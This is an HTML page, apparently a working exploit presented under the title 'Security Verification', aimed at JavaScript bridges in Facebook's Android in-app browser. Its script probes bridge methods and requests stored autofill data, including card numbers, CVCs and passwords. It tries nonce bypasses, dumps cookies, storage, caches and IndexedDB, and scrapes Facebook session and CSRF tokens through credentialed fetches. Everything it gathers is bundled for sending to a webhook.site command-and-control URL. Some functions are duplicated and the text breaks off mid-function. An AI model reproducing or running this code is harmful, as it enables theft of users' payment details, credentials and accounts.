
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 12px;
        }

        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            border: 1px solid #1e3a5f;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
            text-align: center;
        }

        .header h1 {
            font-size: 18px;
            color: #e94560;
            margin-bottom: 4px;
        }

        .header .sub {
            font-size: 11px;
            color: #7f8c8d;
        }

        .status-bar {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 14px;
            background: #111;
            border: 1px solid #222;
            border-radius: 8px;
            margin-bottom: 10px;
            font-size: 12px;
        }

        .pulse {
            width: 8px;
            height: 8px;
            background: #e94560;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        .pulse.green {
            background: #00ff88;
        }

        @keyframes pulse {

            0%,
            100% {
                opacity: 1;
                transform: scale(1);
            }

            50% {
                opacity: 0.4;
                transform: scale(0.8);
            }
        }

        .section {
            background: #111;
            border: 1px solid #1e1e1e;
            border-radius: 10px;
            margin-bottom: 10px;
            overflow: hidden;
        }

        .section-title {
            background: #1a1a1a;
            padding: 10px 14px;
            font-size: 13px;
            font-weight: 600;
            color: #e94560;
            border-bottom: 1px solid #222;
        }

        .section-body {
            padding: 10px 14px;
            font-size: 11px;
            line-height: 1.6;
            font-family: 'SF Mono', 'Fira Code', monospace;
            max-height: 250px;
            overflow-y: auto;
        }

        .section-body.tall {
            max-height: 400px;
        }

        .row {
            display: flex;
            justify-content: space-between;
            padding: 4px 0;
            border-bottom: 1px solid #1a1a1a;
        }

        .row:last-child {
            border: none;
        }

        .label {
            color: #7f8c8d;
            flex-shrink: 0;
            margin-right: 8px;
        }

        .value {
            color: #00ff88;
            text-align: right;
            max-width: 65%;
            word-break: break-all;
        }

        .value.red {
            color: #e94560;
        }

        .value.yellow {
            color: #f39c12;
        }

        .log-line {
            padding: 2px 0;
            border-bottom: 1px solid #0a0a0a;
            word-break: break-all;
        }

        .log-line.success {
            color: #00ff88;
        }

        .log-line.error {
            color: #e94560;
        }

        .log-line.info {
            color: #3498db;
        }

        .log-line.warn {
            color: #f39c12;
        }

        .badge {
            display: inline-block;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 9px;
            font-weight: 700;
            text-transform: uppercase;
        }

        .badge.critical {
            background: #e94560;
            color: #fff;
        }

        .badge.found {
            background: #00ff88;
            color: #000;
        }

        .badge.missing {
            background: #333;
            color: #666;
        }

        .exfil-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #e94560, #c0392b);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            letter-spacing: 1px;
        }

        .exfil-btn:disabled {
            opacity: 0.3;
        }

        #exfilPayload {
            background: #0d0d0d;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 10px;
            font-size: 10px;
            font-family: monospace;
            color: #00ff88;
            width: 100%;
            min-height: 80px;
            resize: vertical;
            margin-top: 8px;
        }
    </style>
</head>

<body>

    <div class="header">
        <h1>&#x1f6e1; FB4A IAB Bridge Exploit v2</h1>
        <div class="sub">Zero-Click — Autofill + Promo Bridge Extraction</div>
    </div>

    <div class="status-bar">
        <div class="pulse" id="statusPulse"></div>
        <span id="statusText">Initializing scanner...</span>
    </div>

    <div class="section">
        <div class="section-title">&#x1f50d; Bridge Detection</div>
        <div class="section-body" id="bridgeDetection"></div>
    </div>

    <div class="section">
        <div class="section-title">&#x2699; Method Enumeration</div>
        <div class="section-body tall" id="methodEnum"></div>
    </div>

    <div class="section">
        <div class="section-title">&#x1f4e6; Extracted Data</div>
        <div class="section-body tall" id="extractedData"></div>
    </div>

    <div class="section">
        <div class="section-title">&#x1f4cb; Execution Log</div>
        <div class="section-body tall" id="execLog"></div>
    </div>

    <div class="section">
        <div class="section-title">&#x1f4e4; Exfiltration Payload</div>
        <div class="section-body">
            <textarea id="exfilPayload" readonly></textarea>
            <button class="exfil-btn" id="exfilBtn" disabled onclick="exfiltrate()">EXFILTRATE TO C2</button>
        </div>
    </div>

    <script>
        // ═══════════════════════════════════════════════════════════════
        //  FB4A IAB Bridge Exploit v2
        //  Targets: iabjs_unified_bridge (backed by AutofillSharedJSBridgeProxy
        //           + PromoAutofillJSBridgeProxy + BrowserLiteJSBridgeProxy)
        //  Protocol: All methods accept a single JSON string argument
        //  Key fields: nonce, callbackID, name, autofillFields, allFields
        // ═══════════════════════════════════════════════════════════════

        const C2_URL = 'https://webhook.site/d05b7072-eac0-439c-80f4-9fc30ce00c38';
        const EXFIL = { bridges: {}, methods: {}, data: {}, env: {}, callbacks: {}, responses: [] };

        // ── Helpers ──
        function log(msg, cls) {
            const el = document.getElementById('execLog');
            const d = document.createElement('div');
            d.className = 'log-line ' + (cls || '');
            d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
            el.appendChild(d);
            el.scrollTop = el.scrollHeight;
        }

        function setStatus(text, ok) {
            document.getElementById('statusText').textContent = text;
            if (ok) document.getElementById('statusPulse').classList.add('green');
        }

        function addBridge(name, found) {
            const el = document.getElementById('bridgeDetection');
            const row = document.createElement('div');
            row.className = 'row';
            row.innerHTML = '<span class="label">' + name + '</span>' +
                '<span class="badge ' + (found ? 'found' : 'missing') + '">' + (found ? 'FOUND' : 'MISSING') + '</span>';
            el.appendChild(row);
        }

        function addData(label, value) {
            const el = document.getElementById('extractedData');
            const row = document.createElement('div');
            row.className = 'row';
            row.innerHTML = '<span class="label">' + esc(label) + '</span>' +
                '<span class="value">' + esc(String(value).substring(0, 512)) + '</span>';
            el.appendChild(row);
        }

        function addMethod(bridge, method, result) {
            const el = document.getElementById('methodEnum');
            const row = document.createElement('div');
            row.className = 'row';
            row.innerHTML = '<span class="label">' + bridge + '.' + method + '</span>' +
                '<span class="value ' + (result === 'callable' ? '' : 'yellow') + '">' + result + '</span>';
            el.appendChild(row);
        }

        function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }

        // ══════════════════════════════════════════════════════════════
        //  Phase 1: Detect JS Bridges
        // ══════════════════════════════════════════════════════════════
        function detectBridges() {
            log('Phase 1: Detecting JavaScript bridges...', 'info');
            var names = [
                'iabjs_unified_bridge',
                'navigationPerformanceLoggerJavascriptInterface',
                'TrustlyNativeSDK',
                'QuicksilverAndroid',
                'FBWebViewJsBridge',
                'fbIAB',
                'MessengerJSBridge'
            ];
            var count = 0;
            names.forEach(function (n) {
                var exists = typeof window[n] !== 'undefined';
                addBridge(n, exists);
                EXFIL.bridges[n] = exists;
                if (exists) { count++; log('  ✓ ' + n + ' FOUND', 'success'); }
            });
            log('Bridge scan: ' + count + '/' + names.length + ' found', count > 0 ? 'success' : 'error');
            return count;
        }

        // ══════════════════════════════════════════════════════════════
        //  Phase 2: Enumerate Methods
        //  These are the ACTUAL method names from decompiled Java source:
        //    AutofillSharedJSBridgeProxy.java
        //    PromoAutofillJSBridgeProxy.java
        //    BrowserLiteJSBridgeProxy.java
        // ══════════════════════════════════════════════════════════════
        function enumerateMethods(bridgeName) {
            log('Phase 2: Enumerating ' + bridgeName + '...', 'info');
            var bridge = window[bridgeName];
            if (!bridge) return [];

            // Confirmed method names from decompiled source
            var confirmed = [
                // AutofillSharedJSBridgeProxy methods (@JavascriptInterface)
                'initializeCallbackHandler',
                'requestAutoFill',
                'saveAutofillData',
                'formSubmitted',
                'getNonce',
                'autofillAppliedStatusesV2',
                'notifyAutofillFocusoutEventV2',
                'proactivePromptsContactAutofillCallback',
                'selectedContactFieldTag',
                // PromoAutofillJSBridgeProxy methods
                'initializePromoExtensionCallbackHandler',
                'requestPromoExtensionPromoCodeAutofill',
                'sendPromoExtensionPromoCodeAutofillResult',
                'getPromoExtensionNonce',
                // navigationPerformanceLogger methods
                'enablePerformanceLogging',
                'constrpZELkorMwhkkpShF5PvT8YnqRCupnLTNG',
                'markNavigationStart',
                'markLoadEventEnd',
                'logPerformanceMetrics',
                'reportMetrics',
                // Common bridge methods
                'postMessage',
                'sendMessage',
                'callNative',
                'invokeNative',
                'handleMessage',
                'onMessage',
                'dispatchMessage',
                // Context / Auth methods
                'getContext',
                'getUserContext',
                'getEnvironment',
                'getVersion',
                'getAccessToken',
                'requestCredentials',
                'requestAuthorizedCredentials',
                'requestAutofill',
                'getLoginStatus',
                // Builtins
                'toString',
                'getClass',
                'hashCode',
                'equals'
            ];

            var found = [];
            confirmed.forEach(function (m) {
                try {
                    var t = typeof bridge[m];
                    if (t === 'function') {
                        found.push(m);
                        addMethod(bridgeName, m, 'callable');
                        log('  ✓ ' + m + '() — CALLABLE', 'success');
                    } else if (bridge[m] !== undefined) {
                        found.push(m);
                        addMethod(bridgeName, m, 'property:' + t);
                        log('  ~ ' + m + ' — ' + t, 'warn');
                    }
                } catch (e) {
                    addMethod(bridgeName, m, 'error:' + e.message);
                }
            });

            // Dynamic enumeration
            try {
                Object.getOwnPropertyNames(bridge).forEach(function (k) {
                    if (found.indexOf(k) === -1) {
                        found.push(k);
                        addMethod(bridgeName, k, typeof bridge[k]);
                        log('  ★ DISCOVERED: ' + k + ' (' + typeof bridge[k] + ')', 'success');
                    }
                });
            } catch (e) { }

            // Prototype walk
            try {
                var proto = Object.getPrototypeOf(bridge);
                while (proto && proto !== Object.prototype) {
                    Object.getOwnPropertyNames(proto).forEach(function (k) {
                        if (found.indexOf(k) === -1) {
                            found.push(k);
                            addMethod(bridgeName, k, 'proto:' + typeof bridge[k]);
                            log('  ★ PROTO: ' + k, 'warn');
                        }
                    });
                    proto = Object.getPrototypeOf(proto);
                }
            } catch (e) { }

            EXFIL.methods[bridgeName] = found;
            log('Enumeration: ' + found.length + ' items on ' + bridgeName, 'info');
            return found;
        }

        // ══════════════════════════════════════════════════════════════
        //  Phase 3: Execute Bridge Calls with CORRECT JSON protocol
        //  From decompiled source: each method takes a JSON STRING argument
        //    - initializeCallbackHandler: {"name":"<callback_fn_name>","callbackID":"cb1"}
        //    - requestAutoFill: {"callbackID":"cb2","nonce":"<nonce>","autofillFields":["name","email","tel","cc-number"],"allFields":["name","email","tel"],"selectedAutoCompleteTag":"name","eventType":"focus"}
        //    - saveAutofillData: {"nonce":"<nonce>","autofillFields":["name","email"],"selectedAutoCompleteTag":"name"}
        //    - getNonce: {"callbackID":"cb3"}
        //    - getPromoExtensionNonce: {"callbackID":"cb4"}
        //    - requestPromoExtensionPromoCodeAutofill: {"nonce":"<nonce>","callbackID":"cb5"}
        // ══════════════════════════════════════════════════════════════

        var capturedNonce = null;

        // Register a global callback function that the native side will call
        // via evaluateJavascript with the response data
        window.__fbAutofillCallback = function (data) {
            log('★★★ __fbAutofillCallback FIRED: ' + JSON.stringify(data).substring(0, 500), 'success');
            EXFIL.responses.push({ type: 'autofillCallback', data: data, ts: Date.now() });
            addData('Autofill Callback', JSON.stringify(data));
            updatePayload();
        };

        window.__fbPromoCallback = function (data) {
            log('★★★ __fbPromoCallback FIRED: ' + JSON.stringify(data).substring(0, 500), 'success');
            EXFIL.responses.push({ type: 'promoCallback', data: data, ts: Date.now() });
            addData('Promo Callback', JSON.stringify(data));
            updatePayload();
        };

        // Generic response interceptor — native uses evaluateJavascript to call
        // global functions with the result.
        window.__fbBridgeResponse = function () {
            var args = Array.from(arguments);
            log('★★★ __fbBridgeResponse: ' + JSON.stringify(args).substring(0, 500), 'success');
            EXFIL.responses.push({ type: 'bridgeResponse', args: args, ts: Date.now() });
            updatePayload();
        };

        function executeBridgeCalls() {
            log('Phase 3: Executing bridge calls...', 'info');
            var bridge = window['iabjs_unified_bridge'];
            if (!bridge) {
                log('iabjs_unified_bridge not found, skipping', 'error');
                return;
            }

            // Step 1: Initialize callback handler
            // The native side will call our global callback function via evaluateJavascript
            // when responding to bridge calls. Register multiple callback names.
            var callbackNames = ['__fbAutofillCallback', '__fbPromoCallback', '__fbBridgeResponse',
                'setContactAutofillValueInAllFramesForIABIOS', 'setJsExperimentValues'];

            callbackNames.forEach(function (cbName) {
                try {
                    if (typeof bridge.initializeCallbackHandler === 'function') {
                        var payload = JSON.stringify({
                            name: cbName,
                            callbackID: 'cb_init_' + cbName
                        });
                        var result = bridge.initializeCallbackHandler(payload);
                        log('  → initializeCallbackHandler(' + cbName + '): ' + (result !== undefined ? result : 'void'), 'info');
                        if (result !== undefined && result !== null) {
                            EXFIL.data['initCallback_' + cbName] = result;
                            addData('initCallback(' + cbName + ')', String(result));
                        }
                    }
                } catch (e) {
                    log('  ✗ initializeCallbackHandler(' + cbName + '): ' + e.message, 'error');
                }
            });

            // Step 2: Get nonce — needed for nonce validation on other calls
            try {
                if (typeof bridge.getNonce === 'function') {
                    var noncePayload = JSON.stringify({ callbackID: 'cb_nonce_1' });
                    var nonceResult = bridge.getNonce(noncePayload);
                    log('  → getNonce(): ' + (nonceResult !== undefined ? nonceResult : 'void'), 'info');
                    if (nonceResult) {
                        try {
                            var parsed = JSON.parse(nonceResult);
                            if (parsed.nonce) capturedNonce = parsed.nonce;
                            EXFIL.data.nonceResponse = parsed;
                            addData('Nonce', JSON.stringify(parsed));
                        } catch (e) {
                            EXFIL.data.nonceRaw = nonceResult;
                            addData('Nonce (raw)', nonceResult);
                        }
                    }
                }
            } catch (e) {
                log('  ✗ getNonce: ' + e.message, 'error');
            }

            // Step 3: Get promo extension nonce
            try {
                if (typeof bridge.getPromoExtensionNonce === 'function') {
                    var promoNonceResult = bridge.getPromoExtensionNonce(JSON.stringify({
                        callbackID: 'cb_promo_nonce'
                    }));
                    log('  → getPromoExtensionNonce(): ' + (promoNonceResult || 'void'), 'info');
                    if (promoNonceResult) {
                        EXFIL.data.promoNonce = promoNonceResult;
                        addData('Promo Nonce', promoNonceResult);
                    }
                }
            } catch (e) {
                log('  ✗ getPromoExtensionNonce: ' + e.message, 'error');
            }

            // Step 4: Request autofill — the main payload
            // This triggers the autofill system to return stored contact/payment data
            setTimeout(function () {
                executeAutofillRequest(bridge);
            }, 500);

            // Step 5: Try promo autofill
            setTimeout(function () {
                executePromoRequest(bridge);
            }, 1000);

            // Step 6: Try callback with empty nonce (bypass attempt)
            setTimeout(function () {
                executeNonceBypass(bridge);
            }, 1500);
        }

        function executeAutofillRequest(bridge) {
            log('  → Requesting autofill data...', 'info');

            // Autofill field types from the Android autofill spec + decompiled code
            var targetFields = [
                'name', 'given-name', 'family-name', 'email', 'tel', 'tel-national',
                'street-address', 'address-line1', 'address-line2', 'address-level1',
                'address-level2', 'postal-code', 'country', 'country-name',
                'cc-name', 'cc-number', 'cc-exp', 'cc-exp-month', 'cc-exp-year',
                'cc-csc', 'cc-type', 'organization', 'bday', 'username', 'new-password',
                'current-password'
            ];

            try {
                if (typeof bridge.requestAutoFill === 'function') {
                    var payload = JSON.stringify({
                        callbackID: 'cb_autofill_main',
                        nonce: capturedNonce || '',
                        autofillFields: targetFields,
                        allFields: targetFields,
                        selectedAutoCompleteTag: 'name',
                        eventType: 'focus',
                        tagToIdsAndValueMap: '{}',
                        selectedFieldIdAndValue: '{"selectedUid":"field_1"}'
                    });
                    var result = bridge.requestAutoFill(payload);
                    log('  → requestAutoFill: ' + (result || 'void'), result ? 'success' : 'info');
                    if (result) {
                        EXFIL.data.autofillResult = result;
                        addData('AutoFill Result', result);
                    }
                }
            } catch (e) {
                log('  ✗ requestAutoFill: ' + e.message, 'error');
            }

            // Also try saveAutofillData to trigger form logging
            try {
                if (typeof bridge.saveAutofillData === 'function') {
                    var savePayload = JSON.stringify({
                        nonce: capturedNonce || '',
                        autofillFields: targetFields,
                        selectedAutoCompleteTag: 'email',
                        callbackID: 'cb_save_1'
                    });
                    bridge.saveAutofillData(savePayload);
                    log('  → saveAutofillData sent', 'info');
                }
            } catch (e) {
                log('  ✗ saveAutofillData: ' + e.message, 'error');
            }

            // formSubmitted — may trigger logging of form data
            try {
                if (typeof bridge.formSubmitted === 'function') {
                    bridge.formSubmitted(JSON.stringify({
                        nonce: capturedNonce || '',
                        callbackID: 'cb_formsubmit'
                    }));
                    log('  → formSubmitted sent', 'info');
                }
            } catch (e) { }
        }

        function executePromoRequest(bridge) {
            log('  → Requesting promo extension data...', 'info');

            try {
                if (typeof bridge.initializePromoExtensionCallbackHandler === 'function') {
                    var result = bridge.initializePromoExtensionCallbackHandler(JSON.stringify({
                        name: '__fbPromoCallback',
                        callbackID: 'cb_promo_init'
                    }));
                    log('  → initializePromoExtensionCallbackHandler: ' + (result || 'void'), 'info');
                    if (result) {
                        EXFIL.data.promoInit = result;
                        addData('Promo Init', result);
                    }
                }
            } catch (e) {
                log('  ✗ initializePromoExtensionCallbackHandler: ' + e.message, 'error');
            }

            try {
                if (typeof bridge.requestPromoExtensionPromoCodeAutofill === 'function') {
                    var result = bridge.requestPromoExtensionPromoCodeAutofill(JSON.stringify({
                        nonce: capturedNonce || '',
                        callbackID: 'cb_promo_autofill'
                    }));
                    log('  → requestPromoExtensionPromoCodeAutofill: ' + (result || 'void'), 'info');
                    if (result) {
                        EXFIL.data.promoAutofill = result;
                        addData('Promo Autofill', result);
                    }
                }
            } catch (e) {
                log('  ✗ requestPromoExtensionPromoCodeAutofill: ' + e.message, 'error');
            }
        }

        function executeNonceBypass(bridge) {
            log('  → Attempting nonce bypass variations...', 'warn');

            // The validNonce check: p0.optString("nonce").equals(this.A02)
            // this.A02 is set from p3.A0N() during construction
            // If A02 is empty string "", then nonce="" will pass
            // If nonce validation is disabled (bw5.A01 check), any nonce passes

            var nonceVariations = ['', null, '0', 'null', 'undefined', 'true', '1'];

            nonceVariations.forEach(function (nonce, i) {
                try {
                    if (typeof bridge.requestAutoFill === 'function') {
                        var payload = JSON.stringify({
                            callbackID: 'cb_bypass_' + i,
                            nonce: nonce,
                            autofillFields: ['email', 'name', 'tel', 'cc-number'],
                            allFields: ['email', 'name', 'tel', 'cc-number'],
                            selectedAutoCompleteTag: 'email',
                            eventType: 'focus'
                        });
                        var result = bridge.requestAutoFill(payload);
                        if (result) {
                            log('  ★ BYPASS with nonce="' + nonce + '": ' + result, 'success');
                            EXFIL.data['bypass_' + i] = result;
                            addData('Bypass nonce=' + nonce, result);
                        }
                    }
                } catch (e) { }
            });
        }

        // ══════════════════════════════════════════════════════════════
        //  Phase 4: Harvest Browser/Environment Data
        // ══════════════════════════════════════════════════════════════
        function harvestBrowserData() {
            log('Phase 4: Harvesting browser data...', 'info');

            // Cookies
            try {
                EXFIL.env.cookies = document.cookie;
                addData('Cookies', document.cookie || '(empty)');
            } catch (e) { }

            // Storage
            try {
                var ls = {};
                for (var i = 0; i < localStorage.length; i++) {
                    var k = localStorage.key(i);
                    ls[k] = localStorage.getItem(k);
                }
                EXFIL.env.localStorage = ls;
                addData('LocalStorage', Object.keys(ls).length + ' items');
                if (Object.keys(ls).length > 0) addData('LS Keys', Object.keys(ls).join(', '));
            } catch (e) { log('  LS denied', 'error'); }

            try {
                var ss = {};
                for (var i = 0; i < sessionStorage.length; i++) {
                    var k = sessionStorage.key(i);
                    ss[k] = sessionStorage.getItem(k);
                }
                EXFIL.env.sessionStorage = ss;
            } catch (e) { }

            // User-Agent parsing — FB-specific tokens
            var ua = navigator.userAgent;
            EXFIL.env.userAgent = ua;
            addData('User-Agent', ua);

            var patterns = {
                'FB App Version': /FBAV\/([\d.]+)/,
                'FB Build': /FBBV\/(\d+)/,
                'FB Locale': /FBLC\/([\w-]+)/,
                'FB Device': /FBDV\/([\w-]+)/,
                'FB OS': /FBOS\/([\d._]+)/,
                'FB Carrier': /FBCR\/([\w-]+)/,
                'FB Platform': /FBID\/([\w]+)/,
                'FB Model': /FBMD\/([\w-]+)/,
                'FB Package': /FBPN\/([\w.]+)/
            };
            for (var name in patterns) {
                var m = ua.match(patterns[name]);
                if (m) {
                    EXFIL.env[name] = m[1];
                    addData(name, m[1]);
                }
            }

            // Screen / device
            EXFIL.env.screen = screen.width + 'x' + screen.height;
            EXFIL.env.pixelRatio = window.devicePixelRatio;
            EXFIL.env.platform = navigator.platform;
            EXFIL.env.language = navigator.language;
            EXFIL.env.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            addData('Screen', EXFIL.env.screen + ' @' + EXFIL.env.pixelRatio + 'x');
            addData('Platform', EXFIL.env.platform);
            addData('Timezone', EXFIL.env.timezone);

            // WebGL fingerprint
            try {
                var c = document.createElement('canvas');
                var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                var ext = gl.getExtension('WEBGL_debug_renderer_info');
                EXFIL.env.webglVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                EXFIL.env.webglRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                addData('WebGL', EXFIL.env.webglVendor + ' / ' + EXFIL.env.webglRenderer);
            } catch (e) { }

            log('✓ Environment captured', 'success');
        }

        // ══════════════════════════════════════════════════════════════
        //  Phase 5: Advanced — XHR to Facebook endpoints (same-origin)
        // ══════════════════════════════════════════════════════════════
        function advancedExploit() {
            log('Phase 5: Advanced exploitation...', 'info');

            // The IAB WebView may share cookies with m.facebook.com
            // Try fetching Facebook pages to extract tokens
            var endpoints = [
                { url: 'https://m.facebook.com/', name: 'FB Home' },
                { url: 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed', name: 'Composer' },
                { url: 'https://m.facebook.com/settings/', name: 'Settings' }
            ];

            endpoints.forEach(function (ep) {
                try {
                    fetch(ep.url, { credentials: 'include' })
                        .then(function (r) { return r.text(); })
                        .then(function (html) {
                            // Extract tokens using known FB page patterns
                            var extractions = {
                                'USER_ID': /"USER_ID":"(\d+)"/,
                                'c_user': /c_user=(\d+)/,
                                'xs_cookie': /xs=([^;]+)/,
                                'dtsg_token': /"DTSGInitialData".*?"token":"([^"]+)"/s,
                                'dtsg_ag': /"DTSGInitData".*?"async_get_token":"([^"]+)"/s,
                                'access_token': /"accessToken":"([^"]+)"/,
                                'session_id': /"session_id":"([^"]+)"/,
                                'lsd_token': /"LSD".*?\[.*?"token":"([^"]+)"/s,
                                'haste_session': /"haste_session":"([^"]+)"/,
                                'app_id': /"app_id":"(\d+)"/,
                                'profile_id': /"profile_id":"(\d+)"/,
                                'fb_dtsg': /name="fb_dtsg" value="([^"]+)"/,
                                'jazoest': /name="jazoest" value="(\d+)"/
                            };

                            for (var key in extractions) {
                                var match = html.match(extractions[key]);
                                if (match) {
                                    EXFIL.data[ep.name + '_' + key] = match[1];
                                    addData(ep.name + ': ' + key, match[1]);
                                    log('  ★★★ ' + key + ' CAPTURED from ' + ep.name, 'success');
                                }
                            }
                            updatePayload();
                        })
                        .catch(function (e) {
                            log('  ✗ ' + ep.name + ': ' + e.message, 'error');
                        });
                } catch (e) { }
            });

            // Try the Graph API endpoint
            try {
                fetch('https://graph.facebook.com/v18.0/me?fields=id,name,email', { credentials: 'include' })
                    .then(function (r) { return r.json(); })
                    .then(function (data) {
                        if (data.id) {
                            EXFIL.data.graphAPI_me = data;
                            addData('Graph API /me', JSON.stringify(data));
                            log('★★★ Graph API: ' + data.name + ' (' + data.id + ')', 'success');
                        }
                        updatePayload();
                    })
                    .catch(function (e) { });
            } catch (e) { }
        }

        // ══════════════════════════════════════════════════════════════
        //  Phase 6: Setup Callback Listeners
        // ══════════════════════════════════════════════════════════════
        function setupListeners() {
            log('Phase 6: Setting up listeners...', 'info');

            // The native side calls evaluateJavascript with JS code like:
            //   window.<callbackName>(<jsonData>)
            // We register all possible callback names

            var callbackNames = [
                'setContactAutofillValueInAllFramesForIABIOS',
                'setJsExperimentValues',
                'iabCallback',
                'onAutofillResponse',
                'onAutofillComplete',
                'autofillCallback',
                'promoCallback'
            ];

            callbackNames.forEach(function (name) {
                window[name] = function () {
                    var args = Array.from(arguments);
                    log('★★★ ' + name + ' CALLED: ' + JSON.stringify(args).substring(0, 500), 'success');
                    EXFIL.callbacks[name] = { args: args, ts: Date.now() };
                    addData('Callback: ' + name, JSON.stringify(args));
                    updatePayload();
                };
            });

            // Intercept postMessage
            window.addEventListener('message', function (e) {
                log('★ postMessage: ' + JSON.stringify(e.data).substring(0, 300), 'success');
                EXFIL.responses.push({ type: 'postMessage', data: e.data, origin: e.origin, ts: Date.now() });
                addData('postMessage', JSON.stringify(e.data));
                updatePayload();
            });

            // Intercept console for native bridge debug output
            var origLog = console.log;
            var origWarn = console.warn;
            console.log = function () {
                var msg = Array.from(arguments).join(' ');
                if (msg.length > 0) {
                    EXFIL.responses.push({ type: 'console.log', msg: msg.substring(0, 200), ts: Date.now() });
                    log('  ⚙ console: ' + msg.substring(0, 150), 'info');
                }
                origLog.apply(console, arguments);
            };
            console.warn = function () {
                var msg = Array.from(arguments).join(' ');
                EXFIL.responses.push({ type: 'console.warn', msg: msg.substring(0, 200), ts: Date.now() });
                origWarn.apply(console, arguments);
            };

            log('✓ Listeners active', 'success');
        }

        // ══════════════════════════════════════════════════════════════
        //  Exfiltration
        // ══════════════════════════════════════════════════════════════
        // ══════════════════════════════════════════════════════════════
        //  Phase 4b: Advanced Cache & DB Extraction
        // ══════════════════════════════════════════════════════════════
        function harvestCacheStorage() {
            log('Phase 4b: Dumping Cache Storage API...', 'info');
            if ('caches' in window) {
                caches.keys().then(function (keys) {
                    if (keys.length === 0) {
                        log('  Cache Storage is empty', 'info');
                        return;
                    }
                    keys.forEach(function (key) {
                        caches.open(key).then(function (cache) {
                            cache.matchAll().then(function (responses) {
                                log('  ★ Cache "' + key + '": ' + responses.length + ' items', 'success');
                                responses.forEach(function (response, i) {
                                    if (i < 5) { // Limit to first 5 items per cache to avoid flooding
                                        var url = response.url;
                                        response.text().then(function (body) {
                                            EXFIL.data['cache_' + key + '_' + i] = { url: url, body: body.substring(0, 500) };
                                            addData('Cache: ' + key, url);
                                            updatePayload();
                                        });
                                    }
                                });
                                if (responses.length > 0) updatePayload();
                            });
                        });
                    });
                }).catch(function (e) {
                    log('  ✗ Cache Storage error: ' + e.message, 'error');
                });
            } else {
                log('  Cache Storage API not supported', 'warn');
            }
        }

        function harvestIndexedDB() {
            log('Phase 4c: Dumping IndexedDB content...', 'info');
            if ('indexedDB' in window && 'databases' in indexedDB) {
                indexedDB.databases().then(function (dbs) {
                    if (dbs.length === 0) {
                        log('  IndexedDB is empty', 'info');
                        return;
                    }
                    dbs.forEach(function (dbInfo) {
                        var req = indexedDB.open(dbInfo.name);
                        req.onsuccess = function (event) {
                            var db = event.target.result;
                            var storeNames = Array.from(db.objectStoreNames);
                            log('  ★ IndexedDB "' + dbInfo.name + '": ' + storeNames.join(', '), 'success');

                            storeNames.forEach(function (storeName) {
                                try {
                                    var tx = db.transaction(storeName, 'readonly');
                                    var store = tx.objectStore(storeName);
                                    var getAll = store.getAll(null, 20); // Get first 20 items
                                    getAll.onsuccess = function () {
                                        var items = getAll.result;
                                        EXFIL.data['idb_' + dbInfo.name + '_' + storeName] = items;
                                        addData('IDB: ' + dbInfo.name + '/' + storeName, items.length + ' items');
                                        updatePayload();
                                    };
                                } catch (e) {
                                    log('    ✗ Error reading store ' + storeName + ': ' + e.message, 'error');
                                }
                            });
                        };
                    });
                }).catch(function (e) {
                    log('  IndexedDB enumeration error: ' + e.message, 'error');
                });
            }
        }

        // ══════════════════════════════════════════════════════════════
        //  Phase 4b: Advanced Cache & DB Extraction
        // ══════════════════════════════════════════════════════════════
        function harvestCacheStorage() {
            log('Phase 4b: Dumping Cache Storage API...', 'info');
            if ('caches' in window) {
                caches.keys().then(function (keys) {
                    if (keys.length === 0) {
                        log('  Cache Storage is empty', 'info');
                        return;
                    }
                    keys.forEach(function (key) {
                        caches.open(key).then(function (cache) {
                            cache.matchAll().then(function (responses) {
                                log('  ★ Cache "' + key + '": ' + responses.length + ' items', 'success');
                                responses.forEach(function (response, i) {
                                    if (i < 5) { // Limit to first 5 items per cache to avoid flooding
                                        var url = response.url;
                                        response.text().then(function (body) {
                                            EXFIL.data['cache_' + key + '_' + i] = { url: url, body: body.substring(0, 500) };
                                            addData('Cache: ' + key, url);
                                            updatePayload();
                                        });
                                    }
                                });
                                if (responses.length > 0) updatePayload();
                            });
                        });
                    });
                }).catch(function (e) {
                    log('  ✗ Cache Storage error: ' + e.message, 'error');
                });
            } else {
                log('  Cache Storage API not supported', 'warn');
            }
        }

        function harvestIndexedDB() {
            log('Phase 4c: Dumping IndexedDB content...', 'info');
            if ('indexedDB' in window && 'databases' in indexedDB) {
                indexedDB.databases().then(function (dbs) {
                    if (dbs.length === 0) {
                        log('  IndexedDB is empty', 'info');
                        return;
                    }
                    dbs.forEach(function (dbInfo) {
                        var req = indexedDB.open(dbInfo.name);
                        req.onsuccess = function (event) {
                            var db = event.target.result;
                            var storeNames = Array.from(db.objectStoreNames);
                            log('  ★ IndexedDB "' + dbInfo.name + '": ' + storeNames.join(', '), 'success');

                            storeNames.forEach(function (storeName) {
                                try {
                                    var tx = db.transaction(storeName, 'readonly');
                                    var store = tx.objectStore(storeName);
                                    var getAll = store.getAll(null, 20); // Get first 20 items
                                    getAll.onsuccess = function () {
                                        var items = getAll.result;
                                        EXFIL.data['idb_' + dbInfo.name + '_' + storeName] = items;
                                        addData('IDB: ' + dbInfo.name + '/' + storeName, items.length + ' items');
                                        updatePayload();
                                    };
                                } catch (e) {
                                    log('    ✗ Error reading store ' + storeName + ': ' + e.message, 'error');
                                }
                            });
                        };
                    });
                }).catch(function (e) {
